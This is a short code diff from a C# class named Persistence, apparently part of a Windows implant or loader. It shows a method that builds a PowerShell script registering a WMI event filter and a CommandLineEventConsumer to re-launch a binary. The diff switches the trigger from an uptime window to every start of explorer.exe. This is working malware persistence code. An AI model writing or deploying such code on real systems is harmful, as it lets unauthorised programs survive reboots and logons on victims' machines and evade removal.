@@ -618,8 +618,6 @@ internal static partial class Persistence
     }
 
     // ── WMI event subscription ───────────────────────────────────────────────
-    // root\subscription: __EventFilter triggers every 60 s after 200 s uptime,
-    // CommandLineEventConsumer re-runs the stub. Requires admin.
 
     public static void InstallWmi(string name)
     {
@@ -631,7 +629,7 @@ internal static partial class Persistence
             var script = $@"
 $ns = 'ROOT\subscription'
 $n  = '{name}'
-$q  = ""SELECT * FROM __InstanceModificationEvent WITHIN 30 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 60 AND TargetInstance.SystemUpTime < 600""
+$q  = ""SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'explorer.exe'""
 try {{
     $f = Set-WmiInstance -Namespace $ns -Class __EventFilter -Arguments @{{Name=$n;EventNamespace='root\cimv2';QueryLanguage='WQL';Query=$q}}
     $c = Set-WmiInstance -Namespace $ns -Class CommandLineEventConsumer -Arguments @{{Name=$n;CommandLineTemplate='""{safePath}""'}}
